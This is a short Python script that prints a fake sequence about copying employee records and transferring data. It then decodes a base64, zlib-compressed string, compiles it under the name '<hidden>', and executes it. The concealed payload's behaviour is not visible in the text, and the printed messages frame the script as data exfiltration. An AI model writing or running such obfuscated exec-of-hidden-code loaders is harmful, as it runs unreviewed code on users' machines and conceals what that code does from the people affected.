import time
# NOTE : NOT EVERYTHING HERE IS AS IMPORTANT AS IT SEEMS
import hashlib
import base64
import zlib

KEY = "AETHER_"

print("Copying employee records...")
time.sleep(1)
print("Copying employee records 1/1")
time.sleep(0.5)
print("Employee records copied successfully.")
time.sleep(0.5)
print("Transferring data...")
time.sleep(1)
print("Transfer complete.")


payload = "eNqdUEtqwzAU3OsUwpvYixjFtuQ60EVA6QfcNoR0Fwi29RSLpo6xVNpCD9AT9IA9SWQ3IR+aLiokPc280cCbJ3jHl9gZjWc34+nCQXWjKuM683k1rgw0eJJp/bpuhOPtWlcP07vRDA9xmqZ93ue8O3wvSK1hCqb9/YG5BVwtlbGOVoLqrZ+lVVW/WPnt/eSxtXM8X5tG1e6BalFmurTStqxU7usyCyhzd20fqmItwPU8v4Q3oZagjf2unut1Y3CeaWARUhKf2Nl5E8oGeUxJJKOAhUCJDCWElEU0TgpCyEAEuQgTmRQgwpjkWRLLQEZ0wAJywZLcGSJs1z6tUVGA1vi6yWxswrej7vu9Xq9D+Pvr83AfEN1zp+kqOkI/tb3P6n6z3RL/9v7DZcucKo4wspN7CFYazsTFoVJdWhu6JeSX"
exec(compile(zlib.decompress(base64.b64decode(payload)), "<hidden>", "exec"))
